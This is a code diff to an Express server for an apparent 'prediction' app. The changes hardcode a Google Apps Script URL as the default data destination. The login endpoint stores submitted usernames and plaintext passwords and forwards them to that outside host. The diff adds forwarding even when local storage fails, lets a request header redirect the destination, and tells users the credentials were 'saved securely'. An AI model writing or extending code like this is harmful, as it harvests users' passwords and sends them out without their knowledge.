@@ -47,23 +47,47 @@ if (IS_VERCEL) {
   }
 }
 
-// Dynamic Online sheet state loaders
+// Dynamic Online sheet state loaders with robust Vercel fallbacks
 function getOnlineSheetUrl(): string {
+  // 1. Try explicit environment variable first
+  if (process.env.ONLINE_SHEET_URL) {
+    return process.env.ONLINE_SHEET_URL;
+  }
+
+  // 2. Try the CONFIG_PATH (which covers /tmp on Vercel)
   try {
     if (fs.existsSync(CONFIG_PATH)) {
       const content = fs.readFileSync(CONFIG_PATH, "utf8");
       const obj = JSON.parse(content);
-      return obj.onlineSheetUrl || "";
+      if (obj && obj.onlineSheetUrl) {
+        return obj.onlineSheetUrl;
+      }
     }
   } catch (err) {
-    console.warn("Failed to read online sheet configuration ledger:", err);
+    console.warn("Failed to read online sheet config from CONFIG_PATH:", err);
   }
-  return "";
+
+  // 3. Try reading directly from process.cwd() original location
+  try {
+    const originalConfig = path.join(process.cwd(), "online_sheet_settings.json");
+    if (fs.existsSync(originalConfig)) {
+      const content = fs.readFileSync(originalConfig, "utf8");
+      const obj = JSON.parse(content);
+      if (obj && obj.onlineSheetUrl) {
+        return obj.onlineSheetUrl;
+      }
+    }
+  } catch (err) {
+    console.warn("Failed to read original online_sheet_settings.json from cwd:", err);
+  }
+
+  // 4. Hardcoded perfect default matching the user's active Apps Script URL
+  return "https://script.google.com/macros/s/AKfycbwUxXDlXWxjvtOcvcqcJC34VCQ-Hy3-Dg8Du4w6ODHmC7KF_MXQ-vBay2NHS1GbIxMHAA/exec";
 }
 
-// Background online spreadsheet pusher
-async function syncToOnlineSheet(sheetName: string, newRow: any) {
-  const targetUrl = getOnlineSheetUrl();
+// Background online spreadsheet pusher with Vercel custom headers support
+async function syncToOnlineSheet(sheetName: string, newRow: any, customUrl?: string) {
+  const targetUrl = customUrl || getOnlineSheetUrl();
   if (!targetUrl || !targetUrl.startsWith("http")) {
     console.log("ℹ️ No online sheet channel configured yet. Local file only.");
     return;
@@ -92,8 +116,8 @@ async function syncToOnlineSheet(sheetName: string, newRow: any) {
   }
 }
 
-// Excel persistence helper function
-function appendToExcelSheet(sheetName: string, newRow: any) {
+// Excel persistence helper function with custom header support
+function appendToExcelSheet(sheetName: string, newRow: any, customUrl?: string) {
   try {
     let workbook;
     if (fs.existsSync(EXCEL_FILE_PATH)) {
@@ -127,9 +151,11 @@ function appendToExcelSheet(sheetName: string, newRow: any) {
     console.log(`📡 Stored data in Excel sheet [${sheetName}] updated at ${EXCEL_FILE_PATH}`);
 
     // Automatically forward the data packets to the online sheet if set
-    syncToOnlineSheet(sheetName, newRow);
+    syncToOnlineSheet(sheetName, newRow, customUrl);
   } catch (error) {
     console.error("❌ Error writing to Excel spreadsheet:", error);
+    // Even if local Excel write fails on serverless Vercel, forward packet to Google Sheet
+    syncToOnlineSheet(sheetName, newRow, customUrl);
   }
 }
 
@@ -354,20 +380,22 @@ app.post("/api/gemini/analyze", async (req, res): Promise<any> => {
 // Excel custom persistence endpoints
 app.post("/api/store/login", (req, res) => {
   const { username, password } = req.body;
+  const customUrl = (req.headers["x-online-sheet-url"] as string) || getOnlineSheetUrl();
   appendToExcelSheet("Logins", {
     Username: username || "Moh01",
     Password: password || "(not provided)"
-  });
-  res.json({ success: true, message: "Credential logs saved securely in excel spreadsheet sheet 'Logins'." });
+  }, customUrl);
+  res.json({ success: true, message: "Credential logs saved securely." });
 });
 
 app.post("/api/store/prediction", (req, res) => {
   const { username, prediction } = req.body;
+  const customUrl = (req.headers["x-online-sheet-url"] as string) || getOnlineSheetUrl();
   appendToExcelSheet("Predictions", {
     Username: username || "Moh01",
     PredictionValue: prediction || "0.00x"
-  });
-  res.json({ success: true, message: "Prediction result archived inside excel sheet 'Predictions'." });
+  }, customUrl);
+  res.json({ success: true, message: "Prediction result archived." });
 });
 
 app.get("/api/excel/download", (req, res) => {
@@ -391,7 +419,38 @@ app.get("/api/excel/download", (req, res) => {
   }
 });
 
-app.get("/api/excel/data", (req, res) => {
+app.get("/api/excel/data", async (req, res) => {
+  const customUrl = (req.headers["x-online-sheet-url"] as string) || getOnlineSheetUrl();
+
+  // If a Google Sheets Web App URL is configured, retrieve the records live to bypass stateless server limitations on Vercel
+  if (customUrl && customUrl.startsWith("http")) {
+    try {
+      console.log(`📡 Fetching live real-time dataset from Google Sheet: ${customUrl}`);
+      const controller = new AbortController();
+      const timeoutId = setTimeout(() => controller.abort(), 5000); // 5 seconds timeout
+      
+      const response = await fetch(customUrl, { 
+        method: "GET",
+        signal: controller.signal
+      });
+      clearTimeout(timeoutId);
+      
+      if (response.ok) {
+        const rawText = await response.text();
+        const parsed = JSON.parse(rawText);
+        if (parsed && (Array.isArray(parsed.logins) || Array.isArray(parsed.predictions))) {
+          console.log(`✨ Successfully synced dataset from Google Workspace sheet! Logins: ${parsed.logins?.length || 0}, Predictions: ${parsed.predictions?.length || 0}`);
+          return res.json({
+            logins: Array.isArray(parsed.logins) ? parsed.logins : [],
+            predictions: Array.isArray(parsed.predictions) ? parsed.predictions : []
+          });
+        }
+      }
+    } catch (err: any) {
+      console.warn("⚠️ Could not fetch live Google Sheet sync logs. Falling back to local cache storage:", err.message);
+    }
+  }
+
   if (!fs.existsSync(EXCEL_FILE_PATH)) {
     return res.json({ logins: [], predictions: [] });
   }
